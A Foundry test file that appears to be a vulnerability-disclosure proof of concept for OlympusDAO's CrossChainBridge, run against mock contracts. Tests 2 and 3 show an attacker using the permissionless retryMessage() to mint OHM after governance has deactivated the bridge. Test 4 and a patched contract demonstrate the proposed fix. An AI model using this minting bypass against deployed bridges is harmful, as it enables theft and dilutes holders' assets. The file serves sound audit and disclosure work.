// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../src/CrossChainBridgePOC.sol";
import "../src/MockContracts.sol";

// ============================================================
// PROOF OF CONCEPT - OlympusDAO CrossChainBridge
// Vulnerability: Broken Security Invariant / Missing bridgeActive Check
//
// Invariant violated: NOT(bridgeActive) => NOT(MintOHM(x)) for all x > 0
//
// Attack vectors:
//   1. retryMessage() - PUBLIC PERMISSIONLESS, bypasses bridgeActive
//   2. lzReceive() - bypasses bridgeActive if lzEndpoint is compromised
//
// Code reference: github.com/OlympusDAO/olympus-v3/src/policies/CrossChainBridge.sol
// ============================================================

// Helper contract to expose failedMessages setter for testing
contract CrossChainBridgePOCHarness is CrossChainBridgePOC {
    
    constructor(address mintr_, address endpoint_) CrossChainBridgePOC(mintr_, endpoint_) {}
    
    /// @notice Test helper: inject a failed message directly into storage
    /// @dev Simulates what lzReceive does when _receiveMessage() reverts
    function injectFailedMessage(
        uint16 srcChainId_,
        bytes calldata srcAddress_,
        uint64 nonce_,
        bytes32 payloadHash_
    ) external {
        failedMessages[srcChainId_][srcAddress_][nonce_] = payloadHash_;
    }
}

contract CrossChainBridgePOCTest is Test {
    
    // ---- Actors ----
    address public governance = address(0x1111); // OlympusDAO Governance
    address public attacker   = address(0x2222); // Attacker
    address public victim     = address(0x3333); // Victim / Mint recipient
    address public user       = address(0x4444); // Legitimate user
    
    // ---- Contracts ----
    MockOHM public ohm;
    MockMINTR public mintr;
    MockLZEndpoint public lzEndpoint;
    CrossChainBridgePOCHarness public bridge;
    
    // ---- Bridge Configuration ----
    uint16 public constant SRC_CHAIN_ID = 101; // Arbitrum (LZ chain ID)
    bytes public trustedRemoteAddress;
    
    // ---- Mint Amount for Attack ----
    uint256 public constant ATTACK_MINT_AMOUNT = 1_000_000 * 1e9; // 1,000,000 OHM (9 decimals)
    
    function setUp() public {
        // Deploy mock contracts
        ohm = new MockOHM();
        mintr = new MockMINTR(address(ohm));
        lzEndpoint = new MockLZEndpoint();
        
        // Deploy bridge harness (governance is admin)
        vm.prank(governance);
        bridge = new CrossChainBridgePOCHarness(address(mintr), address(lzEndpoint));
        
        // Configure LZ endpoint to know the bridge
        lzEndpoint.setBridge(address(bridge));
        
        // Set trusted remote: simulates a trusted bridge on Arbitrum
        // trustedRemote = abi.encodePacked(remoteAddress, localAddress)
        address remoteArbitrumBridge = address(0xABCD);
        trustedRemoteAddress = abi.encodePacked(remoteArbitrumBridge, address(bridge));
        
        vm.prank(governance);
        bridge.setTrustedRemote(SRC_CHAIN_ID, trustedRemoteAddress);
        
        // Give user some OHM for sendOhm tests
        ohm.mint(user, 100 * 1e9); // 100 OHM
        vm.prank(user);
        ohm.approve(address(bridge), type(uint256).max);
        
        console.log("=== SETUP COMPLETE ===");
        console.log("Bridge address:", address(bridge));
        console.log("OHM address:", address(ohm));
        console.log("Bridge active:", bridge.bridgeActive());
        console.log("OHM total supply:", ohm.totalSupply());
    }
    
    // ============================================================
    // TEST 1: Verify sendOhm is correctly protected by bridgeActive
    // ============================================================
    function test_1_SendOhm_CorrectlyBlocked_WhenBridgeDeactivated() public {
        console.log("\n=== TEST 1: sendOhm correctly blocked after deactivation ===");
        
        // Deactivate bridge (governance)
        vm.prank(governance);
        bridge.setBridgeStatus(false);
        
        assertEq(bridge.bridgeActive(), false, "Bridge should be deactivated");
        
        // Attempt to send OHM after deactivation - should revert
        vm.prank(user);
        vm.expectRevert(CrossChainBridgePOC.Bridge_Deactivated.selector);
        bridge.sendOhm{value: 0}(SRC_CHAIN_ID, victim, 10 * 1e9);
        
        console.log("[PASS] sendOhm correctly blocked by bridgeActive = false");
        console.log("       Guard works for OUTBOUND path");
    }
    
    // ============================================================
    // TEST 2: CRITICAL EXPLOIT - retryMessage bypasses bridgeActive
    // Scenario: Message fails -> Bridge deactivated -> Attacker replays
    // ============================================================
    function test_2_CRITICAL_RetryMessage_Bypasses_BridgeActive() public {
        console.log("\n=== TEST 2: CRITICAL EXPLOIT - retryMessage bypasses bridgeActive ===");
        
        bytes memory payload = abi.encode(attacker, ATTACK_MINT_AMOUNT);
        bytes32 payloadHash = keccak256(payload);
        uint64 nonce = 1;
        
        // --- STEP 1: Pre-condition - Inject a failed message ---
        // This simulates what happens when lzReceive stores a message after _receiveMessage() reverts
        // In production: any transient failure (gas, temporary module pause, etc.)
        bridge.injectFailedMessage(SRC_CHAIN_ID, trustedRemoteAddress, nonce, payloadHash);
        
        // Verify message is stored
        bytes32 storedHash = bridge.failedMessages(SRC_CHAIN_ID, trustedRemoteAddress, nonce);
        assertEq(storedHash, payloadHash, "Message should be stored in failedMessages");
        
        console.log("[STEP 1] Failed message injected into failedMessages");
        console.log("         payloadHash stored: TRUE");
        console.log("         Target: attacker receives", ATTACK_MINT_AMOUNT / 1e9, "OHM");
        
        // --- STEP 2: Governance deactivates bridge (EMERGENCY SHUTDOWN) ---
        uint256 supplyBefore = ohm.totalSupply();
        
        vm.prank(governance);
        bridge.setBridgeStatus(false);
        
        assertEq(bridge.bridgeActive(), false, "Bridge must be deactivated");
        console.log("[STEP 2] Governance deactivated bridge (bridgeActive = false)");
        console.log("         OHM supply before attack:", supplyBefore / 1e9, "OHM");
        console.log("         sendOhm() is now blocked - governance believes bridge is safe");
        
        // --- STEP 3: Attacker calls retryMessage (PERMISSIONLESS) ---
        // NO access control, NO bridgeActive check
        console.log("[STEP 3] Attacker calls retryMessage() - PERMISSIONLESS...");
        
        vm.prank(attacker); // Anyone can call retryMessage
        bridge.retryMessage(SRC_CHAIN_ID, trustedRemoteAddress, nonce, payload);
        
        // --- VERIFY EXPLOIT ---
        uint256 supplyAfter = ohm.totalSupply();
        uint256 attackerBalance = ohm.balanceOf(attacker);
        
        console.log("\n=== EXPLOIT RESULT ===");
        console.log("OHM supply before:", supplyBefore / 1e9, "OHM");
        console.log("OHM supply after:", supplyAfter / 1e9, "OHM");
        console.log("OHM illegally minted:", (supplyAfter - supplyBefore) / 1e9, "OHM");
        console.log("Attacker balance:", attackerBalance / 1e9, "OHM");
        console.log("Bridge still deactivated:", !bridge.bridgeActive());
        
        // CRITICAL ASSERTIONS
        assertEq(bridge.bridgeActive(), false, "Bridge should still be deactivated");
        assertGt(supplyAfter, supplyBefore, "EXPLOIT: OHM was minted despite bridge being deactivated");
        assertEq(attackerBalance, ATTACK_MINT_AMOUNT, "Attacker received minted OHM");
        assertEq(supplyAfter - supplyBefore, ATTACK_MINT_AMOUNT, "Exact mint amount confirmed");
        
        console.log("\n[CRITICAL] EXPLOIT CONFIRMED: OHM minted despite bridgeActive = false");
        console.log("[CRITICAL] Invariant violated: NOT(bridgeActive) => NOT(mint) is FALSE");
    }
    
    // ============================================================
    // TEST 3: Mathematical proof - N messages = N unauthorized mints
    // Demonstrates attack scalability
    // ============================================================
    function test_3_CRITICAL_MultipleRetryMessages_MultipleUnauthorizedMints() public {
        console.log("\n=== TEST 3: Multi-message attack - N stored messages = N unauthorized mints ===");
        
        uint256 N = 5; // Number of pre-positioned messages
        uint256 mintPerMessage = 100_000 * 1e9; // 100,000 OHM per message
        
        // Pre-position N messages in failedMessages
        for (uint64 i = 1; i <= N; i++) {
            bytes memory payload = abi.encode(attacker, mintPerMessage);
            bytes32 payloadHash = keccak256(payload);
            bridge.injectFailedMessage(SRC_CHAIN_ID, trustedRemoteAddress, i, payloadHash);
        }
        
        console.log("Pre-positioned messages:", N);
        
        // Governance deactivates bridge
        vm.prank(governance);
        bridge.setBridgeStatus(false);
        
        uint256 supplyBefore = ohm.totalSupply();
        console.log("Bridge deactivated. OHM supply before:", supplyBefore / 1e9, "OHM");
        
        // Attacker replays all messages
        for (uint64 i = 1; i <= N; i++) {
            bytes memory payload = abi.encode(attacker, mintPerMessage);
            vm.prank(attacker);
            bridge.retryMessage(SRC_CHAIN_ID, trustedRemoteAddress, i, payload);
        }
        
        uint256 supplyAfter = ohm.totalSupply();
        uint256 totalMinted = supplyAfter - supplyBefore;
        
        console.log("OHM supply after:", supplyAfter / 1e9, "OHM");
        console.log("Total OHM illegally minted:", totalMinted / 1e9, "OHM");
        console.log("Formula: N * mintPerMessage =", N * mintPerMessage / 1e9, "OHM");
        
        assertEq(totalMinted, N * mintPerMessage, "Total minted matches N * mintPerMessage");
        assertEq(bridge.bridgeActive(), false, "Bridge still deactivated");
        
        console.log("\n[MATH PROOF] Impact = N x amount_per_message");
        console.log("[MATH PROOF] With N pre-positioned messages, attack is unstoppable");
    }
    
    // ============================================================
    // TEST 4: Mitigation verification
    // Demonstrates that the proposed fix resolves the vulnerability
    // ============================================================
    function test_4_MITIGATION_BridgeActiveCheck_In_ReceiveMessage() public {
        console.log("\n=== TEST 4: Mitigation verification ===");
        
        // Deploy fixed bridge
        CrossChainBridgePOC_FIXED fixedBridge = new CrossChainBridgePOC_FIXED(
            address(mintr),
            address(lzEndpoint)
        );
        
        // Configure fixed bridge
        fixedBridge.setTrustedRemote(SRC_CHAIN_ID, trustedRemoteAddress);
        
        // Inject a failed message into the fixed bridge
        bytes memory payload = abi.encode(attacker, ATTACK_MINT_AMOUNT);
        bytes32 payloadHash = keccak256(payload);
        fixedBridge.injectFailedMessage(SRC_CHAIN_ID, trustedRemoteAddress, 1, payloadHash);
        
        // Deactivate the fixed bridge
        fixedBridge.setBridgeStatus(false);
        
        uint256 supplyBefore = ohm.totalSupply();
        
        // Attempt exploit on fixed bridge - should revert with Bridge_Deactivated
        vm.prank(attacker);
        vm.expectRevert(CrossChainBridgePOC.Bridge_Deactivated.selector);
        fixedBridge.retryMessage(SRC_CHAIN_ID, trustedRemoteAddress, 1, payload);
        
        uint256 supplyAfter = ohm.totalSupply();
        
        assertEq(supplyAfter, supplyBefore, "No OHM minted with fixed bridge");
        assertEq(fixedBridge.bridgeActive(), false, "Bridge still deactivated");
        
        console.log("[PASS] Fixed bridge blocks retryMessage when bridgeActive = false");
        console.log("       No OHM illegally minted");
        console.log("       Fix: add 'if (!bridgeActive) revert Bridge_Deactivated();'");
        console.log("       in _receiveMessage() to cover ALL execution paths");
    }
    
    // ============================================================
    // TEST 5: Mathematical proof - OHM backing dilution
    // ============================================================
    function test_5_MATH_BackingDilution_Proof() public {
        console.log("\n=== TEST 5: Mathematical proof - OHM backing dilution ===");
        
        // Initial parameters (mainnet approximation)
        uint256 initialSupply = 17_000_000 * 1e9;    // ~17M OHM supply
        uint256 treasuryValue = 50_000_000 * 1e18;    // ~$50M treasury (USD, 18 decimals)
        
        // Initial backing per OHM
        // backing_scaled = treasuryValue * 1e9 / initialSupply
        uint256 backingBefore = (treasuryValue * 1e9) / initialSupply;
        
        console.log("--- Initial state ---");
        console.log("OHM supply:", initialSupply / 1e9, "OHM");
        console.log("Treasury:", treasuryValue / 1e18, "USD");
        console.log("Backing per OHM (scaled):", backingBefore);
        
        // Attack scenario: mint 10M additional OHM
        uint256 illegalMint = 10_000_000 * 1e9; // 10M OHM
        uint256 newSupply = initialSupply + illegalMint;
        
        // New backing after illegal mint
        uint256 backingAfter = (treasuryValue * 1e9) / newSupply;
        
        console.log("\n--- After attack (illegal mint of 10M OHM) ---");
        console.log("OHM supply:", newSupply / 1e9, "OHM");
        console.log("Treasury:", treasuryValue / 1e18, "USD (unchanged)");
        console.log("Backing per OHM (scaled):", backingAfter);
        
        // Dilution calculation
        uint256 dilutionPercent = ((backingBefore - backingAfter) * 100) / backingBefore;
        
        console.log("\n--- Impact ---");
        console.log("Backing dilution:", dilutionPercent, "%");
        
        // Mathematical verifications
        assertGt(backingBefore, backingAfter, "Backing decreases after illegal mint");
        assertGt(dilutionPercent, 0, "Dilution is positive");
        
        // Formula: dilution = illegalMint / (initialSupply + illegalMint)
        uint256 expectedDilution = (illegalMint * 100) / newSupply;
        assertApproxEqAbs(dilutionPercent, expectedDilution, 1, "Dilution formula verified");
        
        console.log("\n[MATH PROOF VERIFIED]");
        console.log("dilution = illegalMint / (S0 + illegalMint)");
        console.log("With illegalMint >> S0: dilution -> 100%");
    }
}

// ============================================================
// FIXED CONTRACT - For mitigation demonstration
// ============================================================
contract CrossChainBridgePOC_FIXED is CrossChainBridgePOCHarness {
    
    constructor(address mintr_, address endpoint_) CrossChainBridgePOCHarness(mintr_, endpoint_) {}
    
    /// @notice FIXED VERSION of _receiveMessage
    /// @dev Adds bridgeActive check to cover ALL execution paths
    function _receiveMessage(
        uint16 srcChainId_,
        bytes memory srcAddress_,
        uint64 nonce_,
        bytes memory payload_
    ) internal override {
        // FIX: Atomic bridgeActive check on ALL paths (lzReceive, receiveMessage, retryMessage)
        if (!bridgeActive) revert Bridge_Deactivated();
        
        (address to, uint256 amount) = abi.decode(payload_, (address, uint256));
        MINTR.increaseMintApproval(address(this), amount);
        MINTR.mintOhm(to, amount);
        
        emit BridgeReceived(to, amount, srcChainId_);
    }
}
